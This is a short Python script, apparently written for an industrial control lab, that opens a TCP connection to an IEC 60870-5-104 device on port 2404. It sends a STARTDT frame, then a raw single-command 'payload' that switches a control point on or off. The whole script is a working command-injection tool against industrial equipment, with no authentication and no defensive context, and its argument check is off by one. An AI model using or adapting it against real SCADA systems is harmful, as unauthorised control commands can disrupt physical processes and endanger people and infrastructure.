import socket
import sys
from scapy.all import *
from time import sleep
import struct
import binascii

host = '192.168.1.94'
port = 2404
val = 1

if len(sys.argv) >= 3:
	host = sys.argv[1]
	port = int(sys.argv[2])
	val = int(sys.argv[3])

#creates TCP STREAM socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = (host, port)
s.connect(server_address)
print('Connecting.....')

#Payload for IEC device starts to accept commands
p_s = Raw('h\04\07\00\00\00')
p_s.show()
s.send(bytes(p_s))
print('Sending starter packet!!!!')

sleep(4)

com = rdpcap('comando.pcap')

com[0].show()

print('Sending payload!!!')

if val == 1:
	p_c = Raw(load='\x68\x0e\x00\x00\x0c\x00\x2d\x01\x06\x00\x01\x88\x13\x00\x01')
else:
	p_c = Raw(load='\x68\x0e\x00\x00\x0c\x00\x2d\x01\x06\x00\x01\x88\x13\x00\x00')

s.send(bytes(p_c))

sleep(5)

s.close()
